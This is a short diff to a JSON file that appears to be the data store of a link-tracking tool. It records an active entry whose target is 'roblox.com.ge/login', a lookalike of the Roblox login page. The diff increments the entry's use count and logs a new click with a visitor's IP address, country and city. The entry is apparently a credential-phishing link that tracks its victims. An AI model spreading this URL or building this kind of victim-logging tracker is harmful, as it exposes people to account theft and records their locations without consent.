@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1626,
+    "useCount": 1627,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13176,6 +13176,14 @@
         "city": "Ibaraki",
         "flag": "🇯🇵",
         "countryCode": "JP"
+      },
+      {
+        "timestamp": 1777539055736,
+        "ip": "14.191.245.242",
+        "country": "Vietnam",
+        "city": "Huế",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
       }
     ]
   },
